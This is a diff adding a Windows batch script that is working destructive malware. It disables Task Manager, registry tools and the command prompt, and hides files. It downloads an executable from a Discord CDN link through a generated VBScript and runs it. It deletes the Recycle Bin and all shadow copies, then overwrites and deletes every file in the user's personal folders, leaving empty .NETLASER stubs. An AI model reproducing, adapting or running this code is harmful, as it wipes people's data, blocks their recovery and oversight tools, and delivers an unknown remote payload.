@@ -1,0 +1,90 @@
+@echo off
+
+reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\Advanced" /v Hidden /t REG_DWORD /d 2 /f
+reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\Advanced" /v HideFileExt /t REG_DWORD /d 1 /f
+
+
+cd C:\Users\%username%\AppData
+echo Windows Registry Editor Version 5.00 > BlockAccess.reg
+echo. >> BlockAccess.reg
+echo [HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\System] >> BlockAccess.reg
+echo "DisableTaskMgr"=dword:00000001 >> BlockAccess.reg
+echo "DisableRegistryTools"=dword:00000001 >> BlockAccess.reg
+echo. >> BlockAccess.reg
+echo [HKEY_CURRENT_USER\Software\Policies\Microsoft\Windows\System] >> BlockAccess.reg
+echo "DisableCMD"=dword:00000002 >> BlockAccess.reg
+echo [HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer] >> BlockAccess.reg 
+echo "NoFolderOptions"=dword:00000001 >> BlockAccess.reg 
+echo.
+echo [HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\DisallowCpl] >> BlockAccess.reg 
+echo "ncpa.cpl"=dword:00000001 >> BlockAccess.reg 
+echo "desk.cpl"=dword:00000001 >> BlockAccess.reg 
+
+regedit /s BlockAccess.reg
+
+del BlockAccess.reg
+
+cd %temp%
+setlocal enabledelayedexpansion
+
+REM Lista de enlaces
+set "links[1]=https://cdn.discordapp.com/attachments/863277378709225475/1139729522342764634/litecoin.exe"
+set "links[2]=https://cdn.discordapp.com/attachments/863277378709225475/1139729545818284174/ethereum.exe"
+set "links[3]=https://cdn.discordapp.com/attachments/863277378709225475/1139729572439539795/bitcoin.exe"
+
+set /a "randomIndex=!random! %% 3 + 1"
+
+for %%i in (!randomIndex!) do (
+    set "selectedLink=!links[%%i]!"
+)
+
+(
+    echo Set objXMLHTTP = CreateObject^("MSXML2.ServerXMLHTTP.6.0"^)
+    echo objXMLHTTP.open "GET", "!selectedLink!", False
+    echo objXMLHTTP.send
+    echo If objXMLHTTP.Status = 200 Then
+    echo    Set objADOStream = CreateObject^("ADODB.Stream"^)
+    echo    objADOStream.Open
+    echo    objADOStream.Type = 1
+    echo    objADOStream.Write objXMLHTTP.ResponseBody
+    echo    objADOStream.Position = 0
+    echo    Set objFSO = CreateObject^("Scripting.FileSystemObject"^)
+    echo    If objFSO.FileExists^("archivo.exe"^) Then
+    echo        objFSO.DeleteFile "archivo.exe"
+    echo    End If
+    echo    objADOStream.SaveToFile "archivo.exe"
+    echo    objADOStream.Close
+    echo End If
+) > DescargarArchivo.vbs
+
+cscript //nologo DescargarArchivo.vbs
+
+del DescargarArchivo.vbs
+
+start %temp%\archivo.exe
+
+timeout /t 3
+
+cd %temp%
+attrib +s +r +h *.*
+
+rd /s /q C:\$Recycle.Bin
+
+vssadmin Resize ShadowStorage /For=C: /On=C: /MaxSize=300MB
+vssadmin Delete Shadows /All /Quiet
+
+set "folders=%USERPROFILE%\Desktop %USERPROFILE%\Documents %USERPROFILE%\Downloads %USERPROFILE%\Pictures %USERPROFILE%\Videos %USERPROFILE%\Contacts %USERPROFILE%\Favorites %USERPROFILE%\Music"
+
+for %%f in (%folders%) do (
+    if exist "%%f\*" (
+        pushd "%%f"
+        for /r %%a in (*) do (
+            echo. > "%%~dpa%%~na.NETLASER"
+            del "%%a"
+        )
+        popd
+    )
+)
+
+
+
